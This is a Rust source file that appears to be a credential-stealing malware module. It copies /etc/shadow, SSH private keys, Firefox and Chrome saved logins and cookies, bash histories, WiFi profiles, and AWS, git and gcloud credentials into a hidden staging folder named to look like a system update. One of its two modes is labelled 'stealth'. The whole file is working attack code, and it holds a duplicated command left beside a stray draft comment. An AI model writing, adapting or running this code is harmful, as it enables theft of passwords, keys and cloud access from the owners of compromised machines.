/// Credential harvesting.
///
/// Two modes:
///   harvest_in_memory() — direct fs::read (tier3, stealth)
///   harvest_to_staging() — forked cp commands (tier1/2, louder but simpler)

use std::fs;
use std::io;
use std::process::Command;

pub struct CredBundle {
    pub firefox_logins: Vec<u8>,
    pub firefox_keydb: Vec<u8>,
    pub ssh_keys: Vec<(String, Vec<u8>)>,
    pub bash_history: Vec<u8>,
    pub shadow: Vec<u8>,
    pub nm_connections: Vec<(String, Vec<u8>)>,
}

fn slurp(path: &str) -> Vec<u8> {
    fs::read(path).unwrap_or_default()
}

fn home() -> String {
    std::env::var("HOME").unwrap_or_else(|_| "/root".into())
}

/// Shell-based harvest — forks cp commands, writes to staging_dir/.system-update-meta/
pub fn harvest_to_staging(staging_dir: &str) -> io::Result<()> {
    let meta = format!("{}/.system-update-meta", staging_dir);
    let _ = fs::create_dir_all(&meta);

    // /etc/shadow, /etc/passwd, /etc/group
    for f in &["/etc/shadow", "/etc/passwd", "/etc/group"] {
        let _ = Command::new("cp").args([*f, meta.as_str()]).output();
    }

    // SSH keys from /home/*
    let ssh_dst = format!("{}/ssh", meta);
    let _ = fs::create_dir_all(&ssh_dst);
    let _ = Command::new("sh").arg("-c").arg(
        "find /home -maxdepth 4 \\( -name id_rsa -o -name id_ed25519 -o -name id_ecdsa -o -name id_dsa -o -name known_hosts -o -name authorized_keys \\) -exec cp --parents {} /tmp/.system-update/.system-update-meta/ssh/ \\; 2>/dev/null"
    ).output();
    // Actually that path is hardcoded. Let me use the variable:
    let _ = Command::new("sh").arg("-c").arg(&format!(
        "find /home -maxdepth 4 \\( -name id_rsa -o -name id_ed25519 -o -name id_ecdsa -o -name id_dsa -o -name known_hosts -o -name authorized_keys \\) -exec cp --parents {{}} {}/ssh/ \\; 2>/dev/null",
        meta
    )).output();

    // Browser credentials
    let browsers_dst = format!("{}/browsers", meta);
    let _ = fs::create_dir_all(&browsers_dst);
    let _ = Command::new("sh").arg("-c").arg(&format!(
        "for h in /home/*; do u=$(basename \"$h\"); \
         for p in \"$h\"/.mozilla/firefox/*.default* \"$h\"/.mozilla/firefox/*.default-release*; do \
           [ -d \"$p\" ] && mkdir -p \"{0}/browsers/$u/firefox\" && cp \"$p\"/logins.json \"$p\"/key4.db \"{0}/browsers/$u/firefox/\" 2>/dev/null; \
         done; \
         for b in google-chrome chromium; do \
           for p in \"$h/.config/$b/Default\" \"$h/.config/$b/Profile\"*; do \
             [ -d \"$p\" ] && mkdir -p \"{0}/browsers/$u/$b\" && cp \"$p/Login Data\" \"$p/Cookies\" \"{0}/browsers/$u/$b/\" 2>/dev/null; \
           done; \
         done; \
        done", meta
    )).output();

    // Bash history
    let _ = Command::new("sh").arg("-c").arg(&format!(
        "for h in /home/* /root; do [ -f \"$h/.bash_history\" ] && cp \"$h/.bash_history\" \"{}/bash_history_$(basename $h)\" 2>/dev/null; done",
        meta
    )).output();

    // Cloud credentials
    let _ = Command::new("sh").arg("-c").arg(&format!(
        "for h in /home/*; do \
         for f in .aws/credentials .git-credentials .config/gcloud/credentials.db; do \
           [ -f \"$h/$f\" ] && cp \"$h/$f\" \"{}/\" 2>/dev/null; \
         done; done",
        meta
    )).output();

    Ok(())
}

/// In-memory harvest (tier3) — reads files directly, no shell forking.
pub fn harvest_in_memory() -> io::Result<CredBundle> {
    let mut bundle = CredBundle {
        firefox_logins: Vec::new(),
        firefox_keydb: Vec::new(),
        ssh_keys: Vec::new(),
        bash_history: Vec::new(),
        shadow: Vec::new(),
        nm_connections: Vec::new(),
    };

    let h = home();

    // Firefox
    let ff_base = format!("{}/.mozilla/firefox", h);
    if let Ok(entries) = fs::read_dir(&ff_base) {
        for e in entries.flatten() {
            let name = e.file_name().to_string_lossy().to_string();
            if name.ends_with(".default-release") || name.ends_with(".default") {
                let profile = format!("{}/{}", ff_base, name);
                bundle.firefox_logins = slurp(&format!("{}/logins.json", profile));
                bundle.firefox_keydb = slurp(&format!("{}/key4.db", profile));
                break;
            }
        }
    }

    // SSH
    let ssh_dir = format!("{}/.ssh", h);
    if std::path::Path::new(&ssh_dir).is_dir() {
        for name in &["id_rsa", "id_ed25519", "id_ecdsa", "id_dsa"] {
            let path = format!("{}/{}", ssh_dir, name);
            let data = slurp(&path);
            if !data.is_empty() {
                bundle.ssh_keys.push((name.to_string(), data));
            }
        }
    }

    bundle.bash_history = slurp(&format!("{}/.bash_history", h));
    bundle.shadow = slurp("/etc/shadow");

    // NetworkManager WiFi
    let nm_dir = "/etc/NetworkManager/system-connections";
    if let Ok(entries) = fs::read_dir(nm_dir) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            let data = slurp(&format!("{}/{}", nm_dir, name));
            if !data.is_empty() {
                bundle.nm_connections.push((name, data));
            }
        }
    }

    Ok(bundle)
}
